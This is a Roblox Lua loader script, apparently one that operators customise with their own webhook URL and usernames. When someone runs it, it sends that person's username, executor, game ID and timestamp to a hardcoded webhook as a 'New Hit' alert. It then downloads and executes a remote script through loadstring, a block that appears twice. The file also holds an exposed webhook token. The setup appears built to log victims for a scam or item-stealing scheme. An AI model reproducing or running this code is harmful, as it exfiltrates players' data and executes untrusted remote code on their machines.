-- Your Own Loader (with your webhook)

_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494661669849268365/mKzWrChl1qbxDMuG_w9WQyRS4W03KuSQigicg6y__FCCCftfUQoe9QkFfKd5ApNmlEfc"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- Change this to your Roblox usernames

_G.PING_POOR = true   -- true = @everyone ping | false = quiet

-- Send notification when someone runs it
task.spawn(function()
    if _G.POOR_WEBHOOK then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local executor = identifyexecutor and identifyexecutor() or "Unknown"

        local data = {
            content = _G.PING_POOR and "@everyone" or "",
            embeds = {{
                title = "✅ New Hit",
                color = 0x00ff00,
                fields = {
                    {name = "Username", value = plr.Name, inline = true},
                    {name = "Executor", value = executor, inline = true},
                    {name = "Game", value = game.PlaceId, inline = true},
                    {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false}
                }
            }}
        }
        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
    end
end)

-- Load the main script (change this if you have your own main script)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
-- Load the main script (change this if you have your own main script)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
